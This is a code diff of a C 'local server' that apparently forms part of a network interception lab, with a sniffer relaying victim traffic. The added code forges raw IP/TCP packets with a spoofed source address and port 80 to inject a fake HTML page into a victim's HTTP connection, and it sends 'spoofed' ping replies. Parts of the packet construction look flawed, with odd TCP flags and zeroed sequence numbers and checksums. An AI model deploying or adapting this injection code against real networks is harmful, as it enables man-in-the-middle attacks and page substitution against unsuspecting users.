@@ -5,23 +5,139 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <time.h>
-#include <errno.h>  // Add this for errno
+#include <errno.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
 
 #define PORT 9090
 #define BUFFER_SIZE 1024
-#define CLIENT_PORT 8081  // Define the client port to forward messages
-#define FAKE_INDEX_HTML "<!DOCTYPE html>\n" \
-    "<html>\n" \
-    "<head><title>Fake Google</title></head>\n" \
-    "<body>\n" \
-    "<h1>This is a fake Google page</h1>\n" \
-    "<p>You have been intercepted!</p>\n" \
-    "</body>\n" \
-    "</html>\n"
+#define CLIENT_PORT 8081
+#define LOCAL_SERVER_HOST "172.20.0.104"
+#define VICTIM_IP "172.20.0.102"
+#define INDEX_HTML_PATH "./index.html"
+#define MAX_HTML_SIZE 4096
+
+// HTTP response template
+#define FAKE_RESPONSE "HTTP/1.1 200 OK\r\n" \
+    "Content-Type: text/html\r\n" \
+    "Content-Length: %lu\r\n" \
+    "Connection: close\r\n\r\n%s"
+
+// Function to read HTML file
+char* read_html_file() {
+    static char html_content[MAX_HTML_SIZE];
+    FILE *fp = fopen(INDEX_HTML_PATH, "r");
+    if (!fp) {
+        printf("Error opening index.html: %s\n", strerror(errno));
+        return NULL;
+    }
+    
+    size_t bytes_read = fread(html_content, 1, MAX_HTML_SIZE - 1, fp);
+    fclose(fp);
+    
+    if (bytes_read == 0) {
+        printf("Error reading index.html\n");
+        return NULL;
+    }
+    
+    html_content[bytes_read] = '\0';
+    return html_content;
+}
 
 void error(const char *msg) {
     perror(msg);
     exit(1);
+}
+
+void send_fake_response(const char *response, const char *victim_ip, int victim_port) {
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sock < 0) {
+        perror("socket creation failed");
+        return;
+    }
+
+    struct sockaddr_in victim;
+    memset(&victim, 0, sizeof(victim));
+    victim.sin_family = AF_INET;
+    victim.sin_port = htons(victim_port);
+    victim.sin_addr.s_addr = inet_addr(victim_ip);
+
+    // Set IP header
+    char packet[MAX_HTML_SIZE + 512];
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    
+    // Fill IP header
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tos = 0;
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response);
+    ip->id = htons(54321);
+    ip->frag_off = 0;
+    ip->ttl = 64;
+    ip->protocol = IPPROTO_TCP;
+    ip->check = 0;
+    ip->saddr = inet_addr(LOCAL_SERVER_HOST);
+    ip->daddr = victim.sin_addr.s_addr;
+    
+    // Fill TCP header with correct member names
+    tcp->th_sport = htons(80);
+    tcp->th_dport = victim.sin_port;
+    tcp->th_seq = 0;
+    tcp->th_ack = 0;
+    tcp->th_off = 5;    // Data offset
+    tcp->th_flags = TH_SYN | TH_PUSH | TH_ACK;  // Set flags using proper flags field
+    tcp->th_win = htons(5840);
+    tcp->th_sum = 0;    // Checksum
+    tcp->th_urp = 0;    // Urgent pointer
+    
+    // Copy response data
+    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), response, strlen(response));
+    
+    // Send packet
+    if (sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
+        perror("sendto failed");
+    }
+    close(sock);
+}
+
+void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
+    printf("\n[+] Processing request: %s\n", buffer);
+    
+    if (strstr(buffer, "VICTIM_PING") != NULL) {
+        // Send fake ping response
+        const char *response = "ICMP Echo Reply (Spoofed)";
+        sendto(sockfd, response, strlen(response), 0, 
+               (struct sockaddr *)clientaddr, len);
+        printf("[+] Sent fake PING response\n");
+    }
+    else if (strstr(buffer, "VICTIM_HTTP") != NULL) {
+        char *html_content = read_html_file();
+        if (html_content) {
+            char response[MAX_HTML_SIZE + 512];
+            snprintf(response, sizeof(response),
+                    "HTTP/1.1 200 OK\r\n"
+                    "Server: Fake-Server\r\n"
+                    "Content-Type: text/html\r\n"
+                    "Content-Length: %lu\r\n"
+                    "Connection: close\r\n"
+                    "\r\n"
+                    "%s",
+                    strlen(html_content), html_content);
+            
+            // Extract client port from message if available
+            int victim_port = 80;  // default
+            if (sscanf(buffer, "VICTIM_HTTP from %*s to port %d", &victim_port) == 1) {
+                send_fake_response(response, VICTIM_IP, victim_port);
+                printf("[+] Sent fake webpage to %s:%d\n", VICTIM_IP, victim_port);
+            }
+        }
+    }
+
+    // Send acknowledgment to sniffer
+    const char *ack = "ACK: Request processed";
+    sendto(sockfd, ack, strlen(ack), 0, 
+           (struct sockaddr *)clientaddr, len);
 }
 
 int main() {
@@ -64,12 +180,14 @@ int main() {
         printf("\nReady to receive data...\n");
         fflush(stdout);
         
-        int n = recvfrom(sockfd, buffer, BUFFER_SIZE-1, 0, (struct sockaddr *)&clientaddr, &len);
+        int n = recvfrom(sockfd, buffer, BUFFER_SIZE-1, 0, 
+                        (struct sockaddr *)&clientaddr, &len);
         if (n < 0) {
             printf("Error receiving data: %s (errno: %d)\n", strerror(errno), errno);
             continue;
         }
         
+        // Process received data
         buffer[n] = '\0';
         time_t now = time(NULL);
         char timestamp[64];
@@ -81,54 +199,24 @@ int main() {
         printf("Message content (%d bytes): %s\n", n, buffer);
         fflush(stdout);
 
-        // Send immediate acknowledgment
-        const char *ack = "ACK: Message received by local_server";
-        if (sendto(sockfd, ack, strlen(ack), 0, (struct sockaddr *)&clientaddr, len) < 0) {
-            printf("Error sending ACK: %s\n", strerror(errno));
+        // Handle message based on type
+        if (strstr(buffer, "VICTIM_") != NULL) {
+            handle_victim_request(buffer, &clientaddr, len, sockfd);
+            printf("[*] Local Server: %s:%d\n", LOCAL_SERVER_HOST, PORT);
+            printf("[*] Victim IP: %s\n", VICTIM_IP);
+            fflush(stdout);
         } else {
-            printf("Sent ACK to %s:%d\n", 
-                   inet_ntoa(clientaddr.sin_addr), 
-                   ntohs(clientaddr.sin_port));
-        }
-        fflush(stdout);
-
-        // Log based on message type (Ping, HTTP, etc.)
-        if (strstr(buffer, "Ping intercepted from") != NULL) {
-            char victim_ip[INET_ADDRSTRLEN] = {0};
-            char forwarded_by[INET_ADDRSTRLEN] = {0};
-            if (sscanf(buffer, "Ping intercepted from %15s, forwarded by %15s", victim_ip, forwarded_by) == 2) {
-                printf("Parsed sniffer info - Victim IP: %s, Forwarder IP: %s\n", victim_ip, forwarded_by);
-            }
-        }
-
-        if (strstr(buffer, "HTTP request intercepted from") != NULL) {
-            // Send fake index.html page as response
-            const char *response = FAKE_INDEX_HTML;
-            if (sendto(sockfd, response, strlen(response), 0, (struct sockaddr *)&clientaddr, len) < 0) {
-                error("Error sending fake page");
-            }
-            printf("Fake page sent to client at %s\n", inet_ntoa(clientaddr.sin_addr));
-        } else {
-            // Forward the message to the client
-            memset(&forwardaddr, 0, sizeof(forwardaddr));
-            forwardaddr.sin_family = AF_INET;
-            forwardaddr.sin_port = htons(CLIENT_PORT);
-            forwardaddr.sin_addr = clientaddr.sin_addr;  // Forward to the same IP
-
-            if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&forwardaddr, sizeof(forwardaddr)) < 0) {
-                perror("Error forwarding message");
-            } else {
-                printf("Message forwarded to client at %s:%d\n", inet_ntoa(forwardaddr.sin_addr), CLIENT_PORT);
-            }
-
+            // Send acknowledgment
             const char *ack_msg = "Message received and processed by local server";
-            if (sendto(sockfd, ack_msg, strlen(ack_msg), 0, (struct sockaddr *)&clientaddr, len) < 0) {
+            if (sendto(sockfd, ack_msg, strlen(ack_msg), 0, 
+                      (struct sockaddr *)&clientaddr, len) < 0) {
                 perror("Error sending acknowledgment");
             } else {
                 printf("Acknowledgment sent to sniffer\n");
             }
         }
-    }
+    }  // end while
+
     close(sockfd);
     return 0;
-}
+}  // end main
